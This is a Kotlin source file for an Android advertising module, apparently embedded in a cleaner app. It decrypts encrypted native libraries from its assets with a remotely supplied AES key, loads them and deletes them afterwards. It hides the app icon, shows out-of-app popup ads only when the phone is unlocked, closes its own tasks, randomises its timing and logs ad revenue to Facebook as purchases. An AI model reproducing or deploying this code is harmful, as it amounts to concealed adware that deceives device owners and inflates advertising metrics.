package ad

import android.app.Application
import android.app.KeyguardManager
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import com.clean.dependency.Core
import com.clean.dependency.AppLifecycelListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import qr.b.a
import com.clean.dependency.Constant
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.Job
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.text.SimpleDateFormat
import java.util.Currency
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random

/**
 * Date：2025/7/16
 * Describe:
 * b2.D9
 */
object AdE {
    private var sK = "" // 16, 24, or 32 bytes // So 解密的key
    private var mContext: Application = Core.mApp

    @JvmStatic
    var isSAd = false //是否显示广告

    @JvmStatic
    var lastSAdTime = 0L //上一次显示广告的时间

    private val mMainScope = CoroutineScope(Dispatchers.Main)
    private var cTime = 30000L // 检测间隔
    private var tPer = 40000 // 显示间隔
    private var nHourShowMax = 80//小时显示次数
    private var nDayShowMax = 80 //天显示次数
    private var nTryMax = 50 // 失败上限
    private var screenOpenCheck = 1400L // 屏幕监测、延迟显示

    private var numHour = Core.getInt("ad_s_h_n")
    private var numDay = Core.getInt("ad_s_d_n")
    private var isCurDay = Core.getStr("ad_lcd")
    private var numJumps = Core.getInt("ac_njp")

    @JvmStatic
    var isLoadH = false //是否H5的so 加载成功
    private var tagL = "" //调用外弹 隐藏icon字符串
    private var tagO = "" //外弹字符串

    @JvmStatic
    var strBroadKey = "" // 广播的key
    private var pwsss = ""// 文件开关名

    private var timeDS = 100L //延迟显示随机时间开始
    private var timeDE = 400L //延迟显示随机时间结束
    private var checkTimeRandom = 1000 // 在定时时间前后增加x秒

    @JvmStatic
    fun gDTime(): Long {
        if (timeDE < 1 || timeDS < 1) return Random.nextLong(90, 190)
        return Random.nextLong(timeDS, timeDE)
    }

    @JvmStatic
    fun sNumJump(num: Int) {
        numJumps = num
        Core.saveInt("ac_njp", num)
    }

    @JvmStatic
    fun adShow() {
        numHour++
        numDay++
        isSAd = true
        lastSAdTime = System.currentTimeMillis()
        sC()
    }

    private var isPost = false
    private fun pL() {
        if (isPost) return
        isPost = true
        Core.pE("advertise_limit")
    }

    private fun sC() {
        Core.saveInt("ad_s_h_n", numHour)
        Core.saveInt("ad_s_d_n", numDay)
    }

    private fun isCurH(): Boolean {
        val s = Core.getStr("ad_lht")
        if (s.isNotBlank()) {
            if (System.currentTimeMillis() - s.toLong() < 60000 * 60) {
                return true
            }
        }
        Core.saveC("ad_lht", System.currentTimeMillis().toString())
        return false
    }

    private fun isLi(): Boolean {
        val day = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date())
        if (isCurDay != day) {
            isCurDay = day
            Core.saveC("ad_lcd", isCurDay)
            numHour = 0
            numDay = 0
            isPost = false
            sC()
        }
        if (isCurH().not()) {
            numHour = 0
            sC()
        }
        if (numDay >= nDayShowMax) {
            pL()
            return true
        }
        if (numHour >= nHourShowMax) {
            return true
        }
        return false
    }

    @JvmStatic
    fun rfAdmin() {
        val admin = Core.getStr("kuyjHBd")
        try {
            reConfig(JSONObject(admin))
            if (!Core.nextFun) {
                Core.nextFun = true
                a2()
            }
        } catch (e: Exception) {
            Log.e("TAG", "rfAdmin: ${e.message}")
        }
    }

    @JvmStatic
    fun a2() {
        mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
        refreshAdmin()
        File("${mContext.dataDir}/$pwsss").mkdirs()
        t()
    }

    // 如果是Admin写在里面的那么可以直接进行数据
    @JvmStatic
    fun reConfig(js: JSONObject) {
        // JSON数据格式
        sK = js.optString(Constant.K_SO)
        val listStr = js.optString(Constant.K_W).split("-")
        tagL = listStr[0]
        tagO = listStr[1]
        strBroadKey = listStr[2]
        pwsss = listStr[3]

        AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
        val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
        cTime = lt[0].toLong() * 1000
        tPer = lt[1].toInt() * 1000
        nHourShowMax = lt[2].toInt()
        nDayShowMax = lt[3].toInt()
        nTryMax = lt[4].toInt()
        timeDS = lt[5].toLong()
        timeDE = lt[6].toLong()
        checkTimeRandom = lt[7].toInt() * 1000
        screenOpenCheck = lt[8].toLong()
    }

    private var lastS = ""
    private fun refreshAdmin() {
        val s = Core.getStr("xcdd")
        Log.e("TAG", "refreshAdmin: ${s}")
        if (lastS != s) {
            lastS = s
            reConfig(JSONObject(s))
        }
    }

    private fun t() {
        val is64i = is64a()
        mMainScope.launch {
            Core.pE("test_s_dec")
            val time = System.currentTimeMillis()
            val i: Boolean
            withContext(Dispatchers.IO) {
                i = loadSFile(if (is64i) Constant.Fire_64 else Constant.Fire_32)
            }
            if (i.not()) {
                Core.pE("ss_l_f", "$is64i")
                return@launch
            }
            Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
            a.a0(tagL)
            if (isLi().not()) {
                AdCenter.loadAd()
            }
            delay(1200)
            while (true) {
                // 刷新配置
                refreshAdmin()
                var t = cTime
                if (checkTimeRandom > 0) {
                    t = Random.nextLong(cTime - checkTimeRandom, cTime + checkTimeRandom)
                }
                checkAd()
                delay(t)
                if (numJumps > nTryMax) {
                    Core.pE("pop_fail")
                    break
                }
            }
        }

        mMainScope.launch(Dispatchers.IO) {
            delay(1000)
            if (loadSFile(if (is64i) Constant.H_64 else Constant.H_32)) {
                withContext(Dispatchers.Main) {
                    try {
                        Log.e("TAG", "t: net-one")
                        a.b0(mContext)
                        isLoadH = true
                    } catch (_: Throwable) {
                    }
                }
            }
        }
    }

    private fun loadSFile(assetsName: String): Boolean {
        val aIp = mContext.assets.open(assetsName)
        val fSN = "And_${System.currentTimeMillis()}"
        val file = File("${mContext.filesDir}/Cache")
        if (file.exists().not()) {
            file.mkdirs()
        }
        try {
            decrypt(aIp, File(file.absolutePath, fSN))
            val file2 = File(file.absolutePath, fSN)
            System.load(file2.absolutePath)
            file2.delete()
            return true
        } catch (_: Exception) {
        }
        return false
    }


    // 解密
    private fun decrypt(inputFile: InputStream, outputFile: File) {
        val key = SecretKeySpec(sK.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        val outputStream = FileOutputStream(outputFile)
        val inputBytes = inputFile.readBytes()
        val outputBytes = cipher.doFinal(inputBytes)
        outputStream.write(outputBytes)
        outputStream.close()
        inputFile.close()
    }

    private fun is64a(): Boolean {
        // 优先检测64位架构
        for (abi in Build.SUPPORTED_64_BIT_ABIS) {
            if (abi.startsWith("arm64") || abi.startsWith("x86_64")) {
                return true
            }
        }
        for (abi in Build.SUPPORTED_32_BIT_ABIS) {
            if (abi.startsWith("armeabi") || abi.startsWith("x86")) {
                return false
            }
        }
        return Build.CPU_ABI.contains("64")
    }

    @JvmStatic
    fun adLoadSuccess() {
        openJob()
    }

    @JvmStatic
    fun checkAdIsReadyAndGoNext() {
        if (AdCenter.isAdReady()) {
            jobTimer?.cancel()
            jobTimer = null
            openJob()
        }
    }

    private var jobTimer: Job? = null
    private var timJobStart = 0L

    @JvmStatic
    private fun openJob() {
        if (jobTimer != null && jobTimer?.isActive == true) return
        timJobStart = System.currentTimeMillis()
        Core.pE("advertise_done")
        jobTimer = mMainScope.launch {
            val del = tPer - (System.currentTimeMillis() - lastSAdTime)
            delay(del)
            Core.pE("advertise_times")
            if (l().not()) {
                while (l().not()) {
                    delay(screenOpenCheck)
                }
            }
            Core.pE("ad_light")
            delay(finishAc())
            sNumJump(numJumps + 1)
            Core.pE("ad_start")
            a.a0(tagO)
            lastSAdTime = System.currentTimeMillis()
            delay(4000)
            checkAdIsReadyAndGoNext()
        }
    }

    // 新逻辑
    private fun checkAd() {
        if (isNetworkAvailable().not()) return
        if (isLi()) {
            Core.pE("ad_pass", "limit")
            return
        }
        Core.pE("ad_pass", "null")
        AdCenter.loadAd()
        if (System.currentTimeMillis() - timJobStart > 90000) {
            checkAdIsReadyAndGoNext()
        }
    }


    private fun isNetworkAvailable(): Boolean {
        val connectivityManager =
            mContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }

    @JvmStatic
    fun finishAc(): Long {
        if (l().not()) return 0
        val l = Core.c0()
        if (l.isNotEmpty()) {
            ArrayList(l).forEach {
                it.finishAndRemoveTask()
            }
            return 900
        }
        return 0
    }

    private fun l(): Boolean {
        return (mContext.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (mContext.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

    @JvmStatic
    fun postEcpm(ecpm: Double) {
        try {
            val b = Bundle()
            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
            Firebase.analytics.logEvent(Constant.FIRE_NAME, b)
        } catch (_: Exception) {
        }
        if (FacebookSdk.isInitialized().not()) return
        //fb purchase
        AppEventsLogger.newLogger(Core.mApp).logPurchase(
            ecpm.toBigDecimal(), Currency.getInstance("USD")
        )
    }
}